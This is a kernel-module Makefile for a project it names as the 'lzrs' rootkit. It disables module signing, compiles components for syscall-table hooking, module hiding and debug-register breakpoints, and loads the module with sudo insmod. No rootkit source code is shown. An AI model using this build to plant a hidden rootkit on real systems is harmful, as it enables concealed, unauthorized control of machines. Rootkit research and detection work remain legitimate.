CONFIG_MODULE_SIG=n

# module name
ROOTKIT		:= lzrs

# build
MODULE_DIR	:= /lib/modules/$(shell uname -r)
BUILD_DIR	:= $(MODULE_DIR)/build
KERNEL_DIR 	:= $(MODULE_DIR)/kernel

# source dirs
SRC_S 		:= src
INCL_S		:= src/include

# header dirs
SRC_H		:= $(PWD)/$(SRC_S)/headers
INCL_H		:= $(PWD)/$(INCL_S)/headers

# module object
obj-m		:= $(ROOTKIT).o

# core object
$(ROOTKIT)-y	+= src/core.o

# include
$(ROOTKIT)-y 	+= src/syscall_table.o
$(ROOTKIT)-y	+= src/include/utils.o
$(ROOTKIT)-y	+= src/module_hiding.o
$(ROOTKIT)-y	+= src/dr_breakpoints.o
$(ROOTKIT)-y	+= src/hook.o

ccflags-y 	:= -I$(SRC_H) -I$(INCL_H) -g -DDEBUG

# compilation
all:
	$(MAKE) -C $(BUILD_DIR) M=$(PWD) modules

load:
	sudo insmod $(ROOTKIT).ko

unload:
	sudo rmmod $(ROOTKIT)

clean:
	$(MAKE) -C $(BUILD_DIR) M=$(PWD) clean
